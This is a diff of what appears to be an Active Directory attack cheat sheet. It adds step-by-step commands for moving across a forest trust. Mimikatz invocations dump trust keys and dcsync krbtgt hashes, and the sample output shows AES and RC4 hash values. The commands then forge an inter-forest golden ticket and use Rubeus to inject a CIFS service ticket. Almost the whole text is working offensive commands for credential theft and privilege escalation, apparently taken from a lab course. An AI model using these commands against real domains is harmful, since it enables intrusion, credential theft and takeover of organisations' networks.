@@ -209,7 +209,7 @@ C:> Rubeus.exe s4u /user:machine1$ /aes256:<machine1_hash> /msdsspn:http/<host> 
 # When a user's domain is changed, they get a new SID and the old SID is added to `sIDHistory`
 # AD permissions required. Get a cmd on a DA using rubeus or mimikatz
 
-# Get Domain Trust Key in any of following ways
+# Get Domain Trust Key in any of following ways. Need DA on DC
 C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\<parent-dc>$
 C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
@@ -240,10 +240,29 @@ C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<chi
 # Extract secrets from parent domain
 C:> Invoke-Mimikatz -Command '"lsadump::dcsync /user:<parent_Domain>\krbtgt /domain:<parent_Domain_fqdn>" "exit"'
 ```
-
-
 #### Across Forest Using Trust Tickets
+- Only access to explicit resources. In this case to shared folder using CIFS
+```powershell
+# Get Domain Trust Key in any of following ways. Need DA rights on DC.
+C:> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName <dc-host>
+C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
+[[BLAH]]
+Domain: EUROCORP.LOCAL (ecorp / S-1-5-21-1652071801-1423090587-98612180)    <-- Need This
+ [ In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL 
+[[BLAH BLAH]]
+     * aes256_hmac f28a97c2037127a89ddcc2f2562232e9395c90e418914d0b4534870bb6726eee 
+     * aes128_hmac 378202beaecc67b02d855f77d5d3ba82 
+     * rc4_hmac_nt 7a9c598fa3232fa3d59f379c917d56ba                          <-- Need This
+[[BLAH BLAH]]
+
+# Create Inter Forest TGT in attacker machine. Save to file
+C:> C:> Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<domain_fqdn> /sid:<domain_sid> 
+                              /rc4:<rc4_hmac_nt> /service:krbtgt /target:<target_domain_fqdn> /ticket:C:\trust_tkt.kirbi"'
+
+# Create a TGS using the created ticket
+C:> Rubeus.exe asktgs /ticket:trust_tkt.kirbi /service:cifs/eurocorp-dc.moneycorp.local /dc:<target_domain_dc> /ptt
+```
 ### Across Domain Trusts AD Certificate Services
 ---
 
